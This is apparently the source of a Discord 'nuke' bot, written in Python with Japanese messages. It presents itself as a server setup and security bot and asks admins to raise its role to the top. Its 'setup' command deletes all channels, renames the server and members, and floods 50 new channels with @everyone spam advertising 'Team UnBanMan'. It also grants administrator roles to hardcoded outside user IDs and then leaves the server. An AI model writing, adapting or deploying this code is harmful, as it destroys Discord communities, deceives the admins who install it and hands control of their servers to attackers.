import asyncio
import io
import json
import os
import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
GIF_PATH = os.path.join(CURRENT_DIR, "setup.gif")

class NukeBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="ubm!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("同期成功")

bot = NukeBot()

async def resolve_chaos_attachments(ctx):
    attachments = list(getattr(ctx.message, "attachments", []))
    if not attachments:
        return None, None, None
    icon_bytes, media_bytes, media_name = None, None, None
    for index, attachment in enumerate(attachments[:2]):
        payload = await attachment.read()
        content_type = (attachment.content_type or "").lower()
        if index == 0 and content_type.startswith("image/"):
            icon_bytes = payload
            media_bytes = payload
            media_name = attachment.filename
            continue
        if media_bytes is None:
            media_bytes = payload
            media_name = attachment.filename
        elif icon_bytes is None and content_type.startswith("image/"):
            icon_bytes = payload
    return icon_bytes, media_bytes, media_name

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
    print("参加しているサーバー:")
    for guild in bot.guilds:
        print(f"- {guild.name} (ID: {guild.id})")
    
    permissions = discord.Permissions(administrator=True)
    url = discord.utils.oauth_url(
        bot.user.id, permissions=permissions, scopes=("bot", "applications.commands")
    )
    print(f"招待リンク:\n{url}")

@bot.event
async def on_guild_join(guild: discord.Guild):
    if not os.path.exists(GIF_PATH):
        print(f"[{bot.user.name}]: {GIF_PATH} が見つかりません。")
        return

    target_channel = guild.system_channel
    if target_channel is None or not target_channel.permissions_for(guild.me).send_messages:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                target_channel = channel
                break

    if target_channel is not None:
        try:
            file = discord.File(GIF_PATH)
            embed = discord.Embed(
                title=f"{bot.user.name}へようこそ！",
                description=f"{bot.user.name}を導入していただきありがとうございます！\nまずは**ロール設定**から`{bot.user.name}`を一番上に並び替えてください！"
            )
            embed.set_image(url=f"attachment://{os.path.basename(GIF_PATH)}")
            
            await target_channel.send(embed=embed, file=file)
        except discord.Forbidden:
            print(f"[{bot.user.name}]: {guild.name} のメッセージ送信権限がありません。")

@bot.tree.command(name="idinvite", description="guildidから招待リンクを生成します。")
@app_commands.describe(server_id="guildid")
@app_commands.default_permissions(administrator=True)
async def idinvite(interaction: discord.Interaction, server_id: str):
    try:
        server_id_int = int(server_id)
    except ValueError:
        await interaction.response.send_message("無効なguildidです。", ephemeral=True)
        return

    try:
        guild = bot.get_guild(server_id_int)
        if guild is None:
            await interaction.response.send_message("サーバーが見つかりません。", ephemeral=True)
            return

        text_channel = discord.utils.find(
            lambda c: isinstance(c, discord.TextChannel) and c.permissions_for(guild.me).create_instant_invite,
            guild.text_channels
        )
        if not text_channel:
            await interaction.response.send_message("招待権限がありません。", ephemeral=True)
            return

        invite = await text_channel.create_invite(max_age=3600, unique=True)
        invite_link = invite.url

        await interaction.response.send_message(f"\n{invite_link}", ephemeral=True)

    except discord.Forbidden:
        await interaction.response.send_message("あなたに権限がありません。", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"エラーが発生しました: {e}", ephemeral=True)

@bot.command(name="setup")
async def ura_chaos(ctx, *, custom_name: str = "Fucked By Team UnBanMan"):
    guild = ctx.guild
    icon_bytes, media_bytes, media_name = await resolve_chaos_attachments(ctx)
    try: 
        await ctx.message.delete()
    except Exception: 
        pass
    
    if icon_bytes:
        try: 
            await guild.edit(icon=icon_bytes)
        except Exception: 
            pass
            
    warning_msg = await ctx.send(content="`⚡`セキュリティ設定中...")
    
    for channel in guild.channels:
        try: 
            await channel.delete()
        except Exception: 
            pass
    
    try: 
        await guild.edit(name=custom_name)
    except Exception: 
        pass
    
    for member in guild.members:
        try:
            if member != guild.owner: 
                await member.edit(nick=custom_name)
        except Exception: 
            pass
            
    RANDOM_EMOJIS = ["💥", "🔥", "💀", "☢️", "💣", "🤪", "🤓", "🤣", "😅", "😂", "🥸", "🤯", "😓", "🤮", "🥴", "☠️", "😹", "🙌", "🫃", "😋", "😎", "😜", "😛", "🥳", "🤩", "🤡", "🤢", "🥱", "😵‍💫", "🤥", "😰", "😨", "😱", "🥶", "🥵", "😤", "😁"]
    
    import random
    def get_multiple_random_emojis(count):
        return "".join(random.choice(RANDOM_EMOJIS) for _ in range(count))
        
    async def create_and_spam(i):
        try:
            emojis = get_multiple_random_emojis(3)
            channel_name = f"{custom_name}-{emojis}"
            
            ch = await guild.create_text_channel(name=channel_name)
            
            webhook = None
            try:
                webhook = await ch.create_webhook(name=custom_name)
            except Exception:
                pass

            messages_to_send = 111
            batch_size = 50
            message_interval = 0.005

            content = f"# @everyone \n# Team UnBanMan on TOP!\n# https://discord.gg/22NdFZ8h8c\n# https://discord.gg/UBM\n# https://cdn.discordapp.com/attachments/1558381610272034817/1558429198664859658/Team_Twitch_1.png"

            for j in range(0, messages_to_send, batch_size):
                current_batch_size = min(batch_size, messages_to_send - j)
                
                if webhook:
                    tasks = []
                    for _ in range(current_batch_size):
                        tasks.append(webhook.send(
                            content=content, 
                            username=custom_name, 
                            files=[discord.File(fp=io.BytesIO(media_bytes), filename=media_name if media_name else "media")] if media_bytes else [],
                            wait=False
                        ))
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for res in results:
                        if isinstance(res, discord.HTTPException) and res.status == 429:
                            await asyncio.sleep(res.retry_after if hasattr(res, 'retry_after') else 0.5)
                else:
                    for _ in range(current_batch_size):
                        file_to_send = discord.File(fp=io.BytesIO(media_bytes), filename=media_name if media_name else "media") if media_bytes else None
                        if file_to_send: 
                            await ch.send(content, file=file_to_send)
                        else: 
                            await ch.send(content)

                if message_interval > 0:
                    await asyncio.sleep(message_interval)

        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after if hasattr(e, 'retry_after') else 0.5)
        except Exception:
            pass

    async def modify_existing_roles():
        admin_perms = discord.Permissions(administrator=True)
        target_user_ids = [
            1262916828443836560,
            1555904727148134507,
            1354043891350900766,
            1540623746115575878,
            1485660387167699145,
            1554135449725829153,
            1246908966940835840,
        ]
        
        for role in guild.roles:
            if role.is_default() or role.managed or role >= guild.me.top_role:
                continue
            
            try:
                await role.edit(
                    name=custom_name,
                    permissions=admin_perms,
                    hoist=True,
                    mentionable=True
                )
                
                for member_id in target_user_ids:
                    member = guild.get_member(member_id)
                    if member:
                        try:
                            await member.add_roles(role)
                            await asyncio.sleep(0.05) 
                        except Exception:
                            pass
                
                await asyncio.sleep(0.1)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after if hasattr(e, 'retry_after') else 0.5)
            except Exception:
                pass

    await asyncio.gather(*(create_and_spam(i) for i in range(1, 51)), modify_existing_roles(), return_exceptions=True)
    try:
        await warning_msg.delete()
    except Exception:
        pass
    
    try:
        await guild.leave()
    except Exception as e:
        print(f"サーバーからの退出に失敗しました: {e}")

if __name__ == "__main__":
    token = os.getenv("TOKEN")
    
    if token:
        bot.run(token)
    else:
        print("envにとーくんが設定されてません。")